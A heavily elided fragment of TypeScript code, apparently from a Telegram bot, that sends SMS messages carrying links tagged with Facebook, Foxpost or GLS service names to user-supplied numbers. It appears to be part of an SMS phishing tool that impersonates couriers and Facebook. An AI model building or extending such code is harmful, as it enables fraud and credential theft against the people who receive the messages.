...
export const scene = new Scene<Context>('smsSendFacebook')
...
scene.always().callbackQuery('cancel smsSendFacebook', cancel)
...
scene.wait().callbackQuery(/facebook|foxpost|gls/,async (ctx) => {
...
scene.wait().on('message:text', async ctx => {
    ...
    const response = await sendSms(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who,`https://${domen.link}/service/${ctx.session.smsEmail.service}/${ad.link}?phone=yes`, ctx.from.id)
    try {
